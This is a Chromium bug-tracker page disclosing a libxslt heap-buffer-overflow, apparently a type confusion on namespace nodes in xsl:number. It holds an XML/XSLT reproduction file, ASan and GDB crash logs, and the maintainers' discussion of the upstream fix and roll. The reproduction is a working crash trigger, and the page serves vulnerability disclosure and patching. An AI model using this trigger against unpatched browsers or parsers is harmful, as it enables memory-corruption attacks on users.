# Security: READ heap-buffer-overflow in libxslt (type confusion?)

| Field | Value |
|-------|-------|
| **Issue ID** | [40094011](https://issues.chromium.org/issues/40094011) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>XML |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ni...@gmail.com |
| **Assignee** | sc...@chromium.org |
| **Created** | 2019-02-11 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

The following XSLT stylesheet will trigger a READ heap buffer overflow (as detected by ASan). Given that namespaces (a special type of nodes in libxslt) are invloved, I'd bet on another (cf <https://bugs.chromium.org/p/chromium/issues/detail?id=583156>) type confusion bug. ASan and GDB logs are included.

**VERSION**

Chrome Version: Chromium Version 74.0.3696.0 (Developer Build) (64-bit)  

Operating System: Up-to-date Ubuntu 18.04.1 LTS

**REPRODUCTION CASE**

XML:

<?xml-stylesheet type="text/xsl" href="number-key-ns.xsl"?>
<top xmlns:type\_confusion="aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffh" />

XSLT:  

<xsl:stylesheet xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>" version="1.0">  

<xsl:key name="aaa" match="/bbb" use="./ccc"/>  

<xsl:template match="//child::node()">  

<xsl:for-each select="namespace::\*[position()=2]">  

<xsl:number from="key('e','f')"/>  

</xsl:for-each>  

</xsl:template>  

</xsl:stylesheet>

CRASHES

ASan logs from a Chromium tab

# nico@858640435a6f:/work$ chrome -no-sandbox <http://192.168.33.33/libxslt-number/number-key-ns.xml>

==4316==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6040000f4988 at pc 0x55c7b2644de7 bp 0x7ffd3fd72700 sp 0x7ffd3fd726f8  

READ of size 8 at 0x6040000f4988 thread T0 (chrome)  

#0 0x55c7b2644de6 in xmlXPathNextPrecedingSibling third\_party/libxml/src/xpath.c:8206:15  

#1 0x55c7c06005e2 in xsltNumberFormatGetMultipleLevel third\_party/libxslt/src/libxslt/numbers.c:669:25  

#2 0x55c7c05fde57 in xsltNumberFormat third\_party/libxslt/src/libxslt/numbers.c:775:15  

#3 0x55c7c05e4ec9 in xsltNumber third\_party/libxslt/src/libxslt/transform.c:4630:5  

#4 0x55c7c05dae1b in xsltApplySequenceConstructor third\_party/libxslt/src/libxslt/transform.c:2771:17  

#5 0x55c7c05e9092 in xsltForEach third\_party/libxslt/src/libxslt/transform.c:5616:2  

#6 0x55c7c05dae1b in xsltApplySequenceConstructor third\_party/libxslt/src/libxslt/transform.c:2771:17  

#7 0x55c7c05d9470 in xsltApplyXSLTTemplate third\_party/libxslt/src/libxslt/transform.c:3221:5  

#8 0x55c7c05d7afd in xsltProcessOneNode third\_party/libxslt/src/libxslt/transform.c  

#9 0x55c7c05d7afd in xsltDefaultProcessOneNode third\_party/libxslt/src/libxslt/transform.c:2032  

#10 0x55c7c05eafe9 in xsltProcessOneNode third\_party/libxslt/src/libxslt/transform.c:2164:2  

#11 0x55c7c05eafe9 in xsltApplyStylesheetInternal third\_party/libxslt/src/libxslt/transform.c:6041  

#12 0x55c7c06117c1 in blink::XSLTProcessor::TransformToString(blink::Node\*, WTF::String&, WTF::String&, WTF::String&) third\_party/blink/renderer/core/xml/xslt\_processor\_libxslt.cc:392:28  

#13 0x55c7c0502937 in blink::DocumentXSLT::ApplyXSLTransform(blink::Document&, blink::ProcessingInstruction\*) third\_party/blink/renderer/core/xml/document\_xslt.cc:86:19  

#14 0x55c7c050371e in blink::DocumentXSLT::SheetLoaded(blink::Document&, blink::ProcessingInstruction\*) third\_party/blink/renderer/core/xml/document\_xslt.cc:152:7  

#15 0x55c7bda812b0 in blink::ProcessingInstruction::SheetLoaded() third\_party/blink/renderer/core/dom/processing\_instruction.cc:185:10  

#16 0x55c7bda8242c in blink::ProcessingInstruction::NotifyFinished(blink::Resource\*) third\_party/blink/renderer/core/dom/processing\_instruction.cc:238:36  

#17 0x55c7aeafdfd8 in blink::Resource::NotifyFinished() third\_party/blink/renderer/platform/loader/fetch/resource.cc:215:8  

#18 0x55c7bf9ef8a7 in blink::XSLStyleSheetResource::NotifyFinished() third\_party/blink/renderer/core/loader/resource/xsl\_style\_sheet\_resource.cc:83:13  

#19 0x55c7aeb3e363 in blink::ResourceFetcher::HandleLoaderFinish(blink::Resource\*, base::TimeTicks, blink::ResourceFetcher::LoaderFinishType, unsigned int, bool, std::\_\_1::vector<network::cors::PreflightTimingInfo, std::\_\_1::allocator[network::cors::PreflightTimingInfo](javascript:void(0);) > const&) third\_party/blink/renderer/platform/loader/fetch/resource\_fetcher.cc:1750:15  

#20 0x55c7aeb7ee01 in blink::ResourceLoader::DidFinishLoading(base::TimeTicks, long, long, long, bool, std::\_\_1::vector<network::cors::PreflightTimingInfo, std::\_\_1::allocator[network::cors::PreflightTimingInfo](javascript:void(0);) > const&) third\_party/blink/renderer/platform/loader/fetch/resource\_loader.cc:1070:13  

#21 0x55c7c254b36f in content::WebURLLoaderImpl::Context::MaybeCompleteRequest() content/renderer/loader/web\_url\_loader\_impl.cc:1146:16  

#22 0x55c7c16e2eb5 in content::ResourceDispatcher::OnRequestComplete(int, network::URLLoaderCompletionStatus const&) content/renderer/loader/resource\_dispatcher.cc:323:9  

#23 0x55c7c16f8c86 in content::URLLoaderClientImpl::OnComplete(network::URLLoaderCompletionStatus const&) content/renderer/loader/url\_loader\_client\_impl.cc:371:29  

#24 0x55c7a747aa5c in network::mojom::URLLoaderClientStubDispatch::Accept(network::mojom::URLLoaderClient\*, mojo::Message\*) gen/services/network/public/mojom/url\_loader.mojom.cc:1417:13  

#25 0x55c7b11bffd0 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message\*) mojo/public/cpp/bindings/lib/interface\_endpoint\_client.cc:423:32  

#26 0x55c7b11d5c9a in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper\*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:873:42  

#27 0x55c7b11d3cf1 in mojo::internal::MultiplexRouter::Accept(mojo::Message\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:594:38  

#28 0x55c7b11b6a2c in mojo::Connector::DispatchMessage(mojo::Message) mojo/public/cpp/bindings/lib/connector.cc:521:49  

#29 0x55c7b11b8b72 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:596:12  

#30 0x55c7b121bbc3 in Run base/callback.h:129:12  

#31 0x55c7b121bbc3 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple\_watcher.cc:293  

#32 0x55c7b0f41a4e in Run base/callback.h:99:12  

#33 0x55c7b0f41a4e in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:105  

#34 0x55c7b0f440cd in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*, bool\*) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:334:21  

#35 0x55c7b0f43960 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork() base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:225:7  

#36 0x55c7b0e268d0 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:55  

#37 0x55c7b0f45e8e in Run base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:405:12  

#38 0x55c7b0f45e8e in non-virtual thunk to base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc  

#39 0x55c7b0ea90f6 in base::RunLoop::Run() base/run\_loop.cc:150:14  

#40 0x55c7c3ae72a6 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:218:16  

#41 0x55c7afcd6130 in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:504:14  

#42 0x55c7afcda1ec in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:870:10  

#43 0x55c7afe3ba99 in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:431:29  

#44 0x55c7afcd404c in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#45 0x55c7a63585fe in ChromeMain chrome/app/chrome\_main.cc:103:12  

#46 0x7fa29684fb96 in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x21b96)

0x6040000f4988 is located 8 bytes to the left of 48-byte region [0x6040000f4990,0x6040000f49c0)  

allocated by thread T0 (chrome) here:  

#0 0x55c7a63288d3 in \_\_interceptor\_malloc /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:145:3  

#1 0x55c7b2620d42 in xmlStrndup third\_party/libxml/src/xmlstring.c:45:23  

#2 0x55c7b2620d42 in xmlStrdup third\_party/libxml/src/xmlstring.c:71  

#3 0x55c7b2632165 in xmlXPathNodeSetDupNs third\_party/libxml/src/xpath.c:3492:14  

#4 0x55c7b2632165 in xmlXPathNodeSetAddNs third\_party/libxml/src/xpath.c:3690  

#5 0x55c7b26743f2 in xmlXPathNodeCollectAndTest third\_party/libxml/src/xpath.c:12424:8  

#6 0x55c7b266ba88 in xmlXPathCompOpEval third\_party/libxml/src/xpath.c:13476:26  

#7 0x55c7b266ab7b in xmlXPathCompOpEval third\_party/libxml/src/xpath.c:13965:26  

#8 0x55c7b26598c9 in xmlXPathRunEval third\_party/libxml/src/xpath.c:14545:2  

#9 0x55c7b2658a00 in xmlXPathCompiledEvalInternal third\_party/libxml/src/xpath.c:14913:11  

#10 0x55c7b265860f in xmlXPathCompiledEval third\_party/libxml/src/xpath.c:14959:5  

#11 0x55c7c05e88fd in xsltPreCompEval third\_party/libxslt/src/libxslt/transform.c:381:11  

#12 0x55c7c05e88fd in xsltForEach third\_party/libxslt/src/libxslt/transform.c:5526  

#13 0x55c7c05dae1b in xsltApplySequenceConstructor third\_party/libxslt/src/libxslt/transform.c:2771:17  

#14 0x55c7c05d9470 in xsltApplyXSLTTemplate third\_party/libxslt/src/libxslt/transform.c:3221:5  

#15 0x55c7c05d7afd in xsltProcessOneNode third\_party/libxslt/src/libxslt/transform.c  

#16 0x55c7c05d7afd in xsltDefaultProcessOneNode third\_party/libxslt/src/libxslt/transform.c:2032  

#17 0x55c7c05eafe9 in xsltProcessOneNode third\_party/libxslt/src/libxslt/transform.c:2164:2  

#18 0x55c7c05eafe9 in xsltApplyStylesheetInternal third\_party/libxslt/src/libxslt/transform.c:6041  

#19 0x55c7c06117c1 in blink::XSLTProcessor::TransformToString(blink::Node\*, WTF::String&, WTF::String&, WTF::String&) third\_party/blink/renderer/core/xml/xslt\_processor\_libxslt.cc:392:28  

#20 0x55c7c0502937 in blink::DocumentXSLT::ApplyXSLTransform(blink::Document&, blink::ProcessingInstruction\*) third\_party/blink/renderer/core/xml/document\_xslt.cc:86:19  

#21 0x55c7c050371e in blink::DocumentXSLT::SheetLoaded(blink::Document&, blink::ProcessingInstruction\*) third\_party/blink/renderer/core/xml/document\_xslt.cc:152:7  

#22 0x55c7bda812b0 in blink::ProcessingInstruction::SheetLoaded() third\_party/blink/renderer/core/dom/processing\_instruction.cc:185:10  

#23 0x55c7bda8242c in blink::ProcessingInstruction::NotifyFinished(blink::Resource\*) third\_party/blink/renderer/core/dom/processing\_instruction.cc:238:36  

#24 0x55c7aeafdfd8 in blink::Resource::NotifyFinished() third\_party/blink/renderer/platform/loader/fetch/resource.cc:215:8  

#25 0x55c7bf9ef8a7 in blink::XSLStyleSheetResource::NotifyFinished() third\_party/blink/renderer/core/loader/resource/xsl\_style\_sheet\_resource.cc:83:13  

#26 0x55c7aeb3e363 in blink::ResourceFetcher::HandleLoaderFinish(blink::Resource\*, base::TimeTicks, blink::ResourceFetcher::LoaderFinishType, unsigned int, bool, std::\_\_1::vector<network::cors::PreflightTimingInfo, std::\_\_1::allocator[network::cors::PreflightTimingInfo](javascript:void(0);) > const&) third\_party/blink/renderer/platform/loader/fetch/resource\_fetcher.cc:1750:15  

#27 0x55c7aeb7ee01 in blink::ResourceLoader::DidFinishLoading(base::TimeTicks, long, long, long, bool, std::\_\_1::vector<network::cors::PreflightTimingInfo, std::\_\_1::allocator[network::cors::PreflightTimingInfo](javascript:void(0);) > const&) third\_party/blink/renderer/platform/loader/fetch/resource\_loader.cc:1070:13  

#28 0x55c7c254b36f in content::WebURLLoaderImpl::Context::MaybeCompleteRequest() content/renderer/loader/web\_url\_loader\_impl.cc:1146:16  

#29 0x55c7c16e2eb5 in content::ResourceDispatcher::OnRequestComplete(int, network::URLLoaderCompletionStatus const&) content/renderer/loader/resource\_dispatcher.cc:323:9  

#30 0x55c7c16f8c86 in content::URLLoaderClientImpl::OnComplete(network::URLLoaderCompletionStatus const&) content/renderer/loader/url\_loader\_client\_impl.cc:371:29  

#31 0x55c7a747aa5c in network::mojom::URLLoaderClientStubDispatch::Accept(network::mojom::URLLoaderClient\*, mojo::Message\*) gen/services/network/public/mojom/url\_loader.mojom.cc:1417:13  

#32 0x55c7b11bffd0 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message\*) mojo/public/cpp/bindings/lib/interface\_endpoint\_client.cc:423:32  

#33 0x55c7b11d5c9a in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper\*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:873:42  

#34 0x55c7b11d3cf1 in mojo::internal::MultiplexRouter::Accept(mojo::Message\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:594:38

SUMMARY: AddressSanitizer: heap-buffer-overflow third\_party/libxml/src/xpath.c:8206:15 in xmlXPathNextPrecedingSibling  

Shadow bytes around the buggy address:  

0x0c08800168e0: fa fa 00 00 00 00 05 fa fa fa 00 00 00 00 00 00  

0x0c08800168f0: fa fa 00 00 00 00 05 fa fa fa 00 00 00 00 00 00  

0x0c0880016900: fa fa 00 00 00 00 05 fa fa fa 00 00 00 00 00 00  

0x0c0880016910: fa fa 00 00 00 00 00 fa fa fa fd fd fd fd fd fd  

0x0c0880016920: fa fa fd fd fd fd fd fa fa fa 00 00 00 00 00 00  

=>0x0c0880016930: fa[fa]00 00 00 00 00 00 fa fa fd fd fd fd fd fd  

0x0c0880016940: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fd  

0x0c0880016950: fa fa fd fd fd fd fd fd fa fa 00 00 00 00 00 fa  

0x0c0880016960: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0880016970: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0880016980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==4316==ABORTING

GDB logs from xsltproc

nico@8a7692647a15:~/shared/repro# gdb --args xsltproc number-key-ns.xml  

Reading symbols from xsltproc...done.  

(gdb) b xsltApplySequenceConstructor  

(gdb) r  

Starting program: /usr/local/bin/xsltproc number-key-ns.xml

Breakpoint 1, xsltApplySequenceConstructor (ctxt=0x615000000a80, contextNode=0x60c000000040, list=0x60c000000a00, templ=0x60d000000040) at transform.c:2350  

2350 {  

(gdb) p \*contextNode  

$1 = {\_private = 0x0, type = XML\_PI\_NODE, name = 0x6190000000d7 "xml-stylesheet", children = 0x0, last = 0x0, parent = 0x60f000000040, next = 0x60c000000100, prev = 0x0, doc = 0x60f000000040, ns = 0x0,  

content = 0x604000001810 "type="text/xsl" href="number-key-ns.xsl"", properties = 0x0, nsDef = 0x0, psvi = 0x0, line = 1, extra = 0}  

(gdb) c  

Continuing.

Breakpoint 1, xsltApplySequenceConstructor (ctxt=0x615000000a80, contextNode=0x60c000000100, list=0x60c000000a00, templ=0x60d000000040) at transform.c:2350  

2350 {  

(gdb) p \*contextNode  

$2 = {\_private = 0x0, type = XML\_ELEMENT\_NODE, name = 0x6190000000e6 "top", children = 0x0, last = 0x0, parent = 0x60f000000040, next = 0x0, prev = 0x60c000000040, doc = 0x60f000000040, ns = 0x0,  

content = 0xffffffffffffffff <error: Cannot access memory at address 0xffffffffffffffff>, properties = 0x0, nsDef = 0x6040000018d0, psvi = 0x0, line = 2, extra = 0}  

(gdb) c  

Continuing.

# Breakpoint 1, xsltApplySequenceConstructor (ctxt=0x615000000a80, contextNode=0x604000002b50, list=0x60c000000c40, templ=0x0) at transform.c:2350 2350 { (gdb) p \*contextNode <<<<====== looks like a type confusion!! $3 = {\_private = 0x60c000000100, type = XML\_NAMESPACE\_DECL, name = 0x604000002b90 "aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffh", children = 0x6020000022f0, last = 0x0, parent = 0x0, next = 0x2ffffff00000002, prev = 0x1e80000620000030, doc = 0x6161616161616161, ns = 0x6262626262626262, content = 0x6363636363636363 <error: Cannot access memory at address 0x6363636363636363>, properties = 0x6464646464646464, nsDef = 0x6565656565656565, psvi = 0x68666666666666, line = 3, extra = 0} (gdb) c Continuing.

==2615==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x604000002b88 at pc 0x7ffff74af017 bp 0x7fffffff7680 sp 0x7fffffff7678  

READ of size 8 at 0x604000002b88 thread T0  

#0 0x7ffff74af016 in xmlXPathNextPrecedingSibling\_\_internal\_alias /work/libxml2/xpath.c:8203:15  

#1 0x7ffff7b733d9 in xsltNumberFormatGetMultipleLevel /work/libxslt/libxslt/numbers.c:669:25  

#2 0x7ffff7b71e44 in xsltNumberFormat /work/libxslt/libxslt/numbers.c:775:15  

#3 0x7ffff7b99b1a in xsltNumber /work/libxslt/libxslt/transform.c:4638:5  

#4 0x7ffff7b90e31 in xsltApplySequenceConstructor /work/libxslt/libxslt/transform.c:2779:17  

#5 0x7ffff7b9d7b2 in xsltForEach /work/libxslt/libxslt/transform.c:5624:2  

#6 0x7ffff7b90e31 in xsltApplySequenceConstructor /work/libxslt/libxslt/transform.c:2779:17  

#7 0x7ffff7b8ff3b in xsltApplyXSLTTemplate /work/libxslt/libxslt/transform.c:3229:5  

#8 0x7ffff7b8e123 in xsltProcessOneNode /work/libxslt/libxslt/transform.c:2202:2  

#9 0x7ffff7b8e962 in xsltDefaultProcessOneNode /work/libxslt/libxslt/transform.c:2032:3  

#10 0x7ffff7b8e330 in xsltProcessOneNode /work/libxslt/libxslt/transform.c:2164:2  

#11 0x7ffff7b9eaaf in xsltApplyStylesheetInternal /work/libxslt/libxslt/transform.c:6049:5  

#12 0x7ffff7b9fc78 in xsltApplyStylesheetUser /work/libxslt/libxslt/transform.c:6288:11  

#13 0x515c96 in xsltProcess /work/libxslt/xsltproc/xsltproc.c  

#14 0x5148a0 in main /work/libxslt/xsltproc/xsltproc.c:883:7  

#15 0x7ffff6359b96 in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x21b96)  

#16 0x41b109 in \_start (/usr/local/bin/xsltproc+0x41b109)

0x604000002b88 is located 8 bytes to the left of 48-byte region [0x604000002b90,0x604000002bc0)  

allocated by thread T0 here:  

#0 0x4dafc0 in malloc (/usr/local/bin/xsltproc+0x4dafc0)  

#1 0x7ffff74ff9eb in xmlStrndup\_\_internal\_alias /work/libxml2/xmlstring.c:45:23  

#2 0x7ffff74ffaa7 in xmlStrdup\_\_internal\_alias /work/libxml2/xmlstring.c:71:12  

#3 0x7ffff74a45b6 in xmlXPathNodeSetDupNs /work/libxml2/xpath.c:3489:14  

#4 0x7ffff74a4cfc in xmlXPathNodeSetAddNs\_\_internal\_alias /work/libxml2/xpath.c:3687:35  

#5 0x7ffff74c988e in xmlXPathNodeCollectAndTest /work/libxml2/xpath.c:12425:8  

#6 0x7ffff74c50c3 in xmlXPathCompOpEval /work/libxml2/xpath.c:13353:26  

#7 0x7ffff74c4d17 in xmlXPathCompOpEval /work/libxml2/xpath.c:13801:26  

#8 0x7ffff74b82fd in xmlXPathRunEval /work/libxml2/xpath.c:14372:2  

#9 0x7ffff74b7a49 in xmlXPathCompiledEvalInternal /work/libxml2/xpath.c:14740:11  

#10 0x7ffff74b7992 in xmlXPathCompiledEval\_\_internal\_alias /work/libxml2/xpath.c:14786:5  

#11 0x7ffff7b98b65 in xsltPreCompEval /work/libxslt/libxslt/transform.c:381:11  

#12 0x7ffff7b9d0c2 in xsltForEach /work/libxslt/libxslt/transform.c:5534:11  

#13 0x7ffff7b90e31 in xsltApplySequenceConstructor /work/libxslt/libxslt/transform.c:2779:17  

#14 0x7ffff7b8ff3b in xsltApplyXSLTTemplate /work/libxslt/libxslt/transform.c:3229:5  

#15 0x7ffff7b8e123 in xsltProcessOneNode /work/libxslt/libxslt/transform.c:2202:2  

#16 0x7ffff7b8e962 in xsltDefaultProcessOneNode /work/libxslt/libxslt/transform.c:2032:3  

#17 0x7ffff7b8e330 in xsltProcessOneNode /work/libxslt/libxslt/transform.c:2164:2  

#18 0x7ffff7b9eaaf in xsltApplyStylesheetInternal /work/libxslt/libxslt/transform.c:6049:5  

#19 0x7ffff7b9fc78 in xsltApplyStylesheetUser /work/libxslt/libxslt/transform.c:6288:11  

#20 0x515c96 in xsltProcess /work/libxslt/xsltproc/xsltproc.c  

#21 0x5148a0 in main /work/libxslt/xsltproc/xsltproc.c:883:7  

#22 0x7ffff6359b96 in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x21b96)

SUMMARY: AddressSanitizer: heap-buffer-overflow /work/libxml2/xpath.c:8203:15 in xmlXPathNextPrecedingSibling\_\_internal\_alias  

Shadow bytes around the buggy address:  

0x0c087fff8520: fa fa 00 00 00 00 00 00 fa fa 00 00 00 00 05 fa  

0x0c087fff8530: fa fa 00 00 00 00 00 00 fa fa 00 00 00 00 05 fa  

0x0c087fff8540: fa fa 00 00 00 00 00 00 fa fa 00 00 00 00 05 fa  

0x0c087fff8550: fa fa 00 00 00 00 00 00 fa fa fd fd fd fd fd fd  

0x0c087fff8560: fa fa fd fd fd fd fd fa fa fa 00 00 00 00 00 00  

=>0x0c087fff8570: fa[fa]00 00 00 00 00 00 fa fa fd fd fd fd fd fd  

0x0c087fff8580: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fd  

0x0c087fff8590: fa fa fd fd fd fd fd fd fa fa 00 00 00 00 00 00  

0x0c087fff85a0: fa fa fd fd fd fd fd fd fa fa fa fa fa fa fa fa  

0x0c087fff85b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c087fff85c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==2615==ABORTING  

[Inferior 1 (process 2615) exited with code 01]  

(gdb)

**CREDIT INFORMATION**

Reporter credit: Nicolas Grégoire, Agarri

## Timeline

### do...@chromium.org (2019-02-12)

+schenney +scottmg: libxml / libxslt ownership seems a bit murky these days. Is there someone looking after it more closely?

Since libxml was last rolled in March 2018 I'm assuming this is in stable. It looks like it's in the renderer process, so assigning Medium severity.

[Monorail components: Blink>XML]

### do...@chromium.org (2019-02-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-12)

[Empty comment from Monorail migration]

### sc...@chromium.org (2019-02-12)

[Empty comment from Monorail migration]

### sc...@chromium.org (2019-02-12)

Not really, palmer@ and dcheng@ sorta-volunteered to at least try to roll, etc.

### pa...@chromium.org (2019-02-12)

[Empty comment from Monorail migration]

### sc...@chromium.org (2019-02-12)

I'm reproducing and looking at what's happening. At least we can then see if it has been fixed upstream. Asan build is causing me all sorts of trouble, however.

### sc...@chromium.org (2019-02-15)

Reproduced. I think I'll set up a roll to see if it's fixed first, then debug and fix if the roll is insufficient.

### sc...@chromium.org (2019-02-19)

Roll doesn't fix it. I'll fix and roll with one pass.

### ni...@gmail.com (2019-02-19)

Given that this bug also affects libxslt itself, should we invite Nick Wellnhofer (libxslt's maintainer) to this ticket or report the bug upstream? I reported some other bugs (non impacting Chrome) directly last week and fixes were quickly committed to their gitlab...

### pa...@chromium.org (2019-02-19)

#10: Yes, that is a fine idea indeed. If Nick has a Gmail address, please let us know and we'll add them to this bug. Thanks!

### ni...@gmail.com (2019-02-19)

Nick was already invited on previous libxslt bugs I reported, like https://bugs.chromium.org/p/chromium/issues/detail?id=583171#c11 His user profile is at https://bugs.chromium.org/u/543268000/

### pa...@chromium.org (2019-02-19)

Great, thanks!

### we...@aevum.de (2019-02-20)

Fixed upstream: https://gitlab.gnome.org/GNOME/libxslt/commit/08b62c25871b38d5d573515ca8a065b4b8f64f6b

### sc...@chromium.org (2019-02-20)

I think I would also like to modify the libxml import to be sure that it doesn't happen again. Relying on all call sites to provide a safe argument for something like libxml is a recipe for disaster. Bad arguments should fail without security implications.

I'll also roll the updated libxslt.

### we...@aevum.de (2019-02-20)

Yes, the xmlXPathNext* iterators could be made a bit safer in this regard but they aren't really part of the public API anyway. I think the only call site outside of libxml2 is the xsl:number code fixed by the patch.

The main reason for this and many similar bugs are some bad design decisions that were made 15-20 years ago and would require an API overhaul and a new major version to fix.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-02-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/ee86799b2b90cd65e31a42e65fef44c58691285d

commit ee86799b2b90cd65e31a42e65fef44c58691285d
Author: Stephen Chenney <schenney@chromium.org>
Date: Fri Feb 22 03:33:35 2019

Roll libxml, libxslt, that fixes a bug

libxslt fixed an issue with type confusion in xmlXPathNextPrecedingSibling.

R=dcheng@chromium.org
BUG=930663

Change-Id: Ib8055551b370c7d64957152e0fda57090110dee8
Reviewed-on: https://chromium-review.googlesource.com/c/1477805
Commit-Queue: Stephen Chenney <schenney@chromium.org>
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Cr-Commit-Position: refs/heads/master@{#634510}
[add] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/blink/web_tests/http/tests/xmlviewer/ns-node-prev-sibling-expected.png
[add] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/blink/web_tests/http/tests/xmlviewer/ns-node-prev-sibling.html
[add] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/blink/web_tests/http/tests/xmlviewer/resources/number-key-ns.xsl
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/README.chromium
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/chromium/roll.py
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/linux/config.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/linux/include/libxml/xmlversion.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/linux/xml2-config
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/mac/config.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/mac/include/libxml/xmlversion.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/HTMLparser.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/HTMLtree.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/Makefile.am
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/NEWS
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/SAX2.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/configure.ac
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/encoding.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/error.c
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/gentest.py
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/include/libxml/globals.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/include/libxml/tree.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/include/libxml/xmlexports.h
[modify] https://crrev.com/ee86799b2b90cd65e31a42e65fef44c58691285d/third_party/libxml/src/include/wsockcompat.h
